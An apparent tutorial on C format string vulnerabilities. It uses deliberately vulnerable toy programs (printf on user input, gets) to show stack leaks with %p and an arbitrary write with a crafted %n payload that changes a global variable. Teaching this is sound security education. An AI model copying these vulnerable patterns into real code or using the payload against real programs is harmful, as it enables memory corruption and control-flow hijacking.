# Format String Vulnerability 1

Format string vulnerabilities silly bug that is due to the poor coding practice
of the programmer. If an programmer passes an attacker controlled buffer as an
argument to a `printf` call (or any format string related function, e.g `sprintf,
fprintf`), attacker can perform write to arbitrary memory address.  

To understand what I am talking about, take a look at the below example.

```C 
int main(int argc, char** argv) { 
    char buffer[100]; 
    strcpy(buffer, argv[1]); 
    printf(buffer); 
    return 0; 
} 
```

`printf` takes variable number of
arguments and the `format specifier` identifies how many arguments it **should**
access and what kind of data is stored onto that. To read how it takes variable
number of argument refer
[this](https://www.tutorialspoint.com/cprogramming/c_variable_arguments.htm).
And to read more about `format specifiers` refer
[this](http://www.cplusplus.com/reference/cstdio/printf/).

In the above mentioned program if you pass **sane** input like your name. e.g
`./string0 Rohit`. You will get your name on the output.  But attacker do not
always thinks of passing the sane output to the program.  Suppose you passed, lets
say `%x` to the program, since attackers knows that first argument to the printf must
be format specifier, if it is not supplied internally( that is through the
program), a malformed format specifier may list that out the content on the
stack.

:astonished: Attacker can the see the content of STACK.

### See Stack's Content
Lets see that in action. Try doing this:
```bash
$ ./string0 "%p %p %p %p %p"
0xffffd7c9 0x64 0xf0b5ff 0xffffd58e 0x1
$ 
```
Hey what just happened? Attacker's mind  :facepunch: you in the face.
`%p` is used to print the content of the memory in hexadecimal and that just
happened. Attacker fooled **printf** to print the content of memory by not giving
sane input but `format specifier` as input. This is termed as format string
vulnerability.

### What else we can do?
It This is not just limited to displaying the content in memory. This vulnerability
allows the attacker to perform writes to arbitrary memory.
To understand how the writes are actually happening, we need to understand the
concept of `%n`. This format specifier allows the printf to write to memory
location specified by one of its argument.
e.g  
```C
printf("rohit%n", &i);
printf("%d", i);   //outputs to 5 == len(rohit)
```
In brief `%n` writes the number of characters printed so far get saved to `i`.  

Now we have two things in mind:
* Copy our own format specifier in printf.
* Write to some memory location onto stack(or some variable).

### Towards actual exploit. :metal:
Lets try to identify after how many 4 bytes memory locations, we are able to get
back to the buffer. So inorder to do it. I will put say `AAAA` in the beginning
of the exploit string. e.g  
``./string1 'AAAA %p %p %p %p %p %p %p %p %p %p %p %p'``
Output  
`AAAA 0xffffd7af 0x64 0xf0b5ff 0xffffd57e 0x1 0xc2 0xffffd674 0xffffd57e
0xffffd680 0x41414141 0x20702520 0x25207025`
Notice, `0x41414141` third to last. This is nothing but the hex of ASCII('A').
This means we reached the buffer after 9 %p and 10th one is buffer location. 
You may need to do several hit and trials in order to identify starting location
of buffer and it might not be same as mine (10th location).

```C
#include<stdio.h>
#include<string.h>
#include<stdio.h>

int myvar;

int main(int argc, char** argv)
{
    char buffer[100];
    gets(buffer);
    printf(buffer);
    if(myvar)
        printf("Cool you changed it .. :) ");
    return 0;
}
```
Now I will demonstrate Change of control flow using the techniques we have just
learned. Consider the above mentioned code. Find out the address of the buffer
from the current stack location using format string vuln.    
`echo -e 'AAAA %p %p %p %p %p %p %p %p %p %p %p %p' | ./string1`  
Output:  
`AAAA 0x1 0xf7ffd918 0xf0b5ff 0xffffd59e 0x1 0xc2 0xffffd694 0xffffd59e
0xffffd69c 0x41414141 0x20702520 0x25207025`.  
Hey its again the same the 10th location. :metal:  

Now consider,    
`echo -e 'AAAA %p %p %p %p %p %p %p %p %p %n' | ./string1`
This above command will write `len(AAAA %p %p %p %p %p %p %p %p %p ) --> 32` to
to the memory pointed by the 10th argument. But the 10th argument is nothing but
the `0x41414141` so it will try to write onto the memory address pointed by
`0x41414141` the value 32. Since it could be **read-only** memory, so you might
get the `Segmentation Fault`. What about putting some sensible address onto the
buffer instead of `0x41414141`. If we do so, then %n will write to that memory
pointed by that location.
Why not getting the address of `myvar`. Since it is global, we can get the
address of globals before the running the program.  
We will use ,  
`objdump -t ./string1 | grep myvar`      
`0804a028 g     O .bss	00000004              myvar`    
The first data column contains the address for the `myvar`.   


**Crafting the exploit** to change the variable content then change the control
flow.  
`` echo -e `python -c "import struct; print struct.pack('<I',0x0804a028)"`"%p %p
%p %p %p %p %p %p %p %n" | ./string1``  
Output:  
``(0x1 0xf7ffd918 0xf0b5ff 0xffffd59e 0x1 0xc2 0xffffd694 0xffffd59e 0xffffd69c
Cool you changed it .. :)``

:cool: We have exploited the binary.

#### What we have learnt with this?
Format string vulnerability allows to write to arbitrary location in programs
memory.





